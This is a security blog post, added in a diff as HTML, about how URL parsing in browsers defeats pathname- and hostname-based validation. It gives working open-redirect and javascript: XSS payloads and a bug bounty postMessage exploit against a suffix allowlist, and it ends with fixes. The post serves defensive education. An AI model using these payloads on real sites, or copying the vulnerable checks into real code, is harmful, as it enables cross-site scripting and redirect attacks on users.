@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Messing Around with Parsed URLs</title>
+    <link rel="stylesheet" href="https://blog.rwx.fyi/style.css">
+    <link rel="alternate" type="application/atom+xml" title="Feed" href="https://blog.rwx.fyi/atom.xml">
+</head>
+<body>
+    <div class="page">
+        <header class="site-header">
+            <div class="titlebar">
+                <span class="title">Messing Around with Parsed URLs</span>
+                <span class="controls">&#x2014; &#x25FB; &#x2715;</span>
+            </div>
+            <nav>
+                <a href="https:&#x2F;&#x2F;blog.rwx.fyi">index</a>
+                <a href="https://blog.rwx.fyi/about/">about</a>
+                <a href="https://blog.rwx.fyi/smallscan/">smallscan</a>
+                <a href="https://blog.rwx.fyi/atom.xml" class="feed-link">feed</a>
+            </nav>
+        </header>
+        <main>
+            
+<article>
+    <header class="post-header">
+        <h1>Messing Around with Parsed URLs</h1>
+        <div class="post-meta">
+            <time>2026.04.15</time>
+            
+        </div>
+    </header>
+    <div class="post-body">
+        <h2 id="claims">Claims</h2>
+<ul>
+<li><code>new URL(userControlled).pathname</code> is <strong>not</strong> safe to feed into <code>location.href</code>. For special schemes (<code>http</code>, <code>https</code>, <code>ws</code>, <code>wss</code>, <code>ftp</code>, <code>file</code>) it can start with <code>//</code> and turn into an open redirect. For non-special schemes it can start with <code>javascript:</code> and turn into XSS.</li>
+<li>The <code>.hostname</code> of a <code>URL</code> is also not safe to allowlist against, because browsers happily parse <code>javascript://...stuff...evil.com</code> into a "URL" whose hostname ends in your trusted domain.</li>
+<li>Both behaviors come straight from the <a rel="external" href="https://url.spec.whatwg.org/">WHATWG URL Standard</a>. Browsers are doing the spec-conformant thing. The bugs are in the application code.</li>
+<li>The <code>URL</code> API looks like a sanitizer and, if done right, it can <em>be</em> a sanitizer, but it comes with a few footguns.</li>
+</ul>
+<h2 id="what-started-this">What started this</h2>
+<p>I saw this <a rel="external" href="https://www.youtube.com/shorts/hWVk9jb6L10">Critical Thinking Podcast short</a> that pointed out a <code>javascript:</code> URL parsed by <code>new URL()</code> can end up with a <code>hostname</code> attribute. This is kind of weird. Turns out there seems to be a lot of code on the web where devs rely on attributes of <code>URL</code>-parsed objects for validating user-controlled data and there is more than one way this can lead to problems. I will explore two of them here.</p>
+<h2 id="extra-slashes-in-special-urls">Extra slashes in special URLs</h2>
+<p>This is a standard pattern and looks fine on first read:</p>
+<pre class="giallo" style="color: #E0DEF4; background-color: #232136;"><code data-lang="javascript"><span class="giallo-l"><span style="color: #908CAA;font-style: italic;">//</span><span style="color: #6E6A86;font-style: italic;"> redirect client to the path of a given URL</span></span>
+<span class="giallo-l"><span style="color: #3E8FB0;">const</span><span style="font-style: italic;"> userControlledURL</span><span style="color: #3E8FB0;"> = new</span><span style="color: #EA9A97;"> URL</span><span>(</span><span style="font-style: italic;">userControlled</span><span>)</span></span>
+<span class="giallo-l"><span style="font-style: italic;">location</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">href</span><span style="color: #3E8FB0;"> =</span><span style="font-style: italic;"> userControlledURL</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">pathname</span></span></code></pre>
+<p>You would expect the code to just pull out the path, so even if <code>userControlled</code> is something like <code>https://evil.com/foo</code>, the code will navigate to <code>/foo</code> on the current origin. Reasonable.</p>
+<p>But:</p>
+<pre class="giallo" style="color: #E0DEF4; background-color: #232136;"><code data-lang="javascript"><span class="giallo-l"><span>(</span><span style="color: #3E8FB0;">new</span><span style="color: #EA9A97;"> URL</span><span>(</span><span style="color: #F6C177;">&quot;https://nice.com//evil.com&quot;</span><span>))</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">pathname</span></span>
+<span class="giallo-l"><span style="color: #908CAA;font-style: italic;">//</span><span style="color: #6E6A86;font-style: italic;"> -&gt; &quot;//evil.com&quot;</span></span></code></pre>
+<p>If <code>userControlled === "https://nice.com//evil.com"</code>, the snippet above sets <code>location.href = "//evil.com"</code>, which the browser resolves as a protocol-relative URL, straight to <code>https://evil.com</code>. Open redirect.</p>
+<p>The browser treats <code>/</code> as a path-segment separator inside <a rel="external" href="https://url.spec.whatwg.org/#path-state">path state</a>. The relevant rule, paraphrased: "if <code>c</code> is <code>/</code>, then terminate the current path segment." (the same is true for <code>\</code> by the way).</p>
+<p>So tracing <code>https://nice.com//evil.com</code> through the parser: after <code>https://nice.com</code> is consumed, path state runs with <code>c = /</code> and an empty buffer. Special URL, <code>c</code> is <code>/</code> → terminate the (empty) segment. Path is now <code>[""]</code>. Then it reads <code>evil.com</code> into the buffer, end-of-input flushes it. Final path: <code>["", "evil.com"]</code>. The serializer joins with <code>/</code> and prefixes one, giving <code>"//evil.com"</code>.</p>
+<p>For <code>https:</code> URIs the path is guaranteed to start with a <code>/</code>. That doesn't save you here: <code>//evil.com</code> also starts with <code>/</code>.</p>
+<h2 id="it-gets-worse-with-custom-schemes">It gets worse with custom schemes</h2>
+<p>For non-special schemes, if the scheme isn't followed by <code>//</code>, the parser goes straight to path state and the pathname gets no leading <code>/</code>:</p>
+<pre class="giallo" style="color: #E0DEF4; background-color: #232136;"><code data-lang="javascript"><span class="giallo-l"><span>(</span><span style="color: #3E8FB0;">new</span><span style="color: #EA9A97;"> URL</span><span>(</span><span style="color: #F6C177;">&quot;bla:javascript:alert(1)&quot;</span><span>))</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">pathname</span></span>
+<span class="giallo-l"><span style="color: #908CAA;font-style: italic;">//</span><span style="color: #6E6A86;font-style: italic;"> -&gt; &quot;javascript:alert(1)&quot;</span></span></code></pre>
+<p>So if <code>userControlled === "bla:javascript:alert(1)"</code> and the same redirect snippet runs:</p>
+<pre class="giallo" style="color: #E0DEF4; background-color: #232136;"><code data-lang="javascript"><span class="giallo-l"><span style="font-style: italic;">location</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">href</span><span style="color: #3E8FB0;"> =</span><span style="color: #F6C177;"> &quot;javascript:alert(1)&quot;</span></span></code></pre>
+<p>XSS!</p>
+<h2 id="quick-write-up-of-a-real-world-bug-bounty-finding">Quick write-up of a real-world bug bounty finding</h2>
+<p>Back to the initial observation that <code>javascript:</code> URLs can have non-falsey <code>.hostname</code>/<code>.host</code> attributes. After learning that, I went back to a target with a web message handler that I had looked at before but didn't manage to exploit. The vulnerable code was a <code>message</code> handler that looked roughly like this:</p>
+<pre class="giallo" style="color: #E0DEF4; background-color: #232136;"><code data-lang="javascript"><span class="giallo-l"><span style="font-style: italic;">window</span><span style="color: #3E8FB0;">.</span><span style="color: #EA9A97;">addEventListener</span><span>(</span><span style="color: #F6C177;">&quot;message&quot;</span><span style="color: #908CAA;">, (</span><span style="color: #C4A7E7;font-style: italic;">event</span><span style="color: #908CAA;">)</span><span style="color: #3E8FB0;"> =&gt;</span><span style="color: #908CAA;"> {</span></span>
+<span class="giallo-l"><span style="color: #3E8FB0;">    let</span><span style="font-style: italic;"> data</span><span style="color: #3E8FB0;"> =</span><span style="font-style: italic;"> event</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">data</span><span style="color: #908CAA;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #3E8FB0;">    if</span><span> (</span><span style="font-style: italic;">data</span><span style="color: #3E8FB0;">?.</span><span style="font-style: italic;">event_type</span><span style="color: #3E8FB0;"> ===</span><span style="color: #F6C177;"> &quot;NAVIGATE&quot;</span><span>)</span><span style="color: #908CAA;"> {</span></span>
+<span class="giallo-l"><span style="color: #3E8FB0;">        try</span><span style="color: #908CAA;"> {</span></span>
+<span class="giallo-l"><span style="color: #3E8FB0;">            let</span><span style="font-style: italic;"> t</span><span style="color: #3E8FB0;"> = new</span><span style="color: #EA9A97;"> URL</span><span>(</span><span style="font-style: italic;">data</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">href</span><span>)</span><span style="color: #908CAA;">;</span></span>
+<span class="giallo-l"><span style="color: #3E8FB0;">            if</span><span> (</span></span>
+<span class="giallo-l"><span style="font-style: italic;">                t</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">hostname</span><span style="color: #3E8FB0;">.</span><span style="color: #EA9A97;">endsWith</span><span>(</span><span style="color: #F6C177;">&quot;.target.com&quot;</span><span>)</span></span>
+<span class="giallo-l"><span>            )</span><span style="color: #908CAA;"> {</span></span>
+<span class="giallo-l"><span style="font-style: italic;">                router</span><span style="color: #3E8FB0;">.</span><span style="color: #EA9A97;">push</span><span>(</span><span style="font-style: italic;">data</span><span style="color: #3E8FB0;">.</span><span style="font-style: italic;">href</span><span>)</span><span style="color: #908CAA;">;</span></span>
+<span class="giallo-l"><span style="color: #908CAA;">            }</span></span>
+<span class="giallo-l"><span style="color: #908CAA;">        }</span><span style="color: #3E8FB0;"> catch</span><span style="color: #908CAA;"> {}</span></span>
+<span class="giallo-l"><span style="color: #908CAA;">    }</span></span>
+<span class="giallo-l"><span style="color: #908CAA;">}</span><span>)</span><span style="color: #908CAA;">;</span></span></code></pre>
+<p>Two things going wrong:</p>
+<ol>
+<li>No <code>event.origin</code> check on the message itself.</li>
+<li>As pointed out: <strong><code>.hostname</code> of a parsed URL is not what you think it is</strong> when the URL has a non-special scheme.</li>
+</ol>
+<p>To get a <code>.hostname</code>, the string still has to start with <code>[SCHEME]://...</code>. This is possible with a functioning XSS payload. To check this yourself, try this in the DevTools console:</p>
+<pre class="giallo" style="color: #E0DEF4; background-color: #232136;"><code data-lang="plain"><span class="giallo-l"><span>&gt; let url = new URL(&quot;javascript://%0aconsole.log(&#39;pwned&#39;)%2f%2f.example.com/&quot;)</span></span>
+<span class="giallo-l"><span>&gt; url.hostname</span></span>
+<span class="giallo-l"><span>&quot;%0aconsole.log(&#39;pwned&#39;)%2f%2f.example.com&quot;</span></span>
+<span class="giallo-l"><span>&gt; url.host</span></span>
+<span class="giallo-l"><span>&quot;%0aconsole.log(&#39;pwned&#39;)%2f%2f.example.com&quot;</span></span>
+<span class="giallo-l"><span>&gt; window.location = url.href</span></span>
+<span class="giallo-l"><span>// pwned</span></span></code></pre>
+<p>This is the WHATWG behavior: the spec lets non-special URLs carry an authority. So the exploit:</p>
+<pre class="giallo" style="color: #E0DEF4; background-color: #232136;"><code data-lang="javascript"><span class="giallo-l"><span style="color: #3E8FB0;">const</span><span style="font-style: italic;"> win</span><span style="color: #3E8FB0;"> =</span><span style="font-style: italic;"> window</span><span style="color: #3E8FB0;">.</span><span style="color: #EA9A97;">open</span><span>(</span><span style="color: #F6C177;">&quot;https://www.target.com/&quot;</span><span>)</span></span>
+<span class="giallo-l"><span style="color: #3E8FB0;">await new</span><span style="color: #9CCFD8;"> Promise</span><span>(</span><span style="color: #C4A7E7;font-style: italic;">r</span><span style="color: #3E8FB0;"> =&gt;</span><span style="color: #EA9A97;"> setTimeout</span><span>(</span><span style="font-style: italic;">r</span><span style="color: #908CAA;">,</span><span style="color: #EA9A97;"> 600</span><span>))</span><span style="color: #908CAA;font-style: italic;">  //</span><span style="color: #6E6A86;font-style: italic;"> wait for load</span></span>
+<span class="giallo-l"><span style="font-style: italic;">win</span><span style="color: #3E8FB0;">.</span><span style="color: #EA9A97;">postMessage</span><span>(</span><span style="color: #908CAA;">{</span></span>
+<span class="giallo-l"><span style="color: #F6C177;">    &quot;event_type&quot;</span><span style="color: #908CAA;">:</span><span style="color: #F6C177;"> &quot;NAVIGATE&quot;</span><span style="color: #908CAA;">,</span></span>
+<span class="giallo-l"><span style="color: #F6C177;">    &quot;href&quot;</span><span style="color: #908CAA;">:</span><span style="color: #F6C177;"> &quot;javascript://%0aalert(document.domain)%2f%2f.target.com/&quot;</span></span>
+<span class="giallo-l"><span style="color: #908CAA;">},</span><span style="color: #F6C177;"> &quot;*&quot;</span><span>)</span></span></code></pre>
+<p><code>new URL(data.href)</code> parses, <code>.hostname</code> is <code>%0aalert(document.domain)%2f%2f.target.com</code> (and therefore ends with <code>.target.com</code>), suffix check passes. <code>router.push(data.href)</code> runs with the same string, the browser navigates to a <code>javascript:</code> URL, and:</p>
+<ul>
+<li><code>%0a</code> decodes to a newline, terminating the JS comment that the <code>//</code> opened</li>
+<li><code>alert(document.domain)</code> runs on the next line</li>
+<li><code>//.target.com/</code> is a trailing comment</li>
+</ul>
+<h2 id="wrapping-up">Wrapping up</h2>
+<p>Going back to the claims at the top: <code>URL</code> <em>can</em> be used as a sanitizer, but only if you check the scheme first. Without that check, <code>.pathname</code>, <code>.hostname</code>, <code>.host</code> are just <em>components of the parse result</em>, and what those components mean depends entirely on the scheme. Two vectors discussed above are instances of the same mistake: trusting a component without first asking whether the scheme makes that component meaningful:</p>
+<ul>
+<li><code>.pathname</code> looks like a relative path, but for special URLs it can start with <code>//</code> (backslash trick), and for non-special URLs it can be <code>javascript:alert(1)</code> (opaque path).</li>
+<li><code>.hostname</code> looks like a hostname, but for non-special URLs it's whatever bytes the spec lets you stuff between <code>//</code> and the next path-terminating character.</li>
+</ul>
+<p>A short list of things that are <em>probably</em> safe for redirect/allowlist code:</p>
+<ul>
+<li>Compare <code>parsed.origin === "https://your.exact.origin"</code> and reject anything else.</li>
+<li>Explicitly check <code>parsed.protocol === "https:"</code> before doing anything with <code>parsed.hostname</code>.</li>
+<li>If you want to redirect to a path, prefix it: <code>window.location = window.location.origin + "/" + parsed.pathname.substr(1)</code>.</li>
+</ul>
+
+    </div>
+</article>
+
+        </main>
+        <footer>
+            <div class="status">last modified 2026.04.15</div>
+        </footer>
+    </div>
+</body>
+</html>
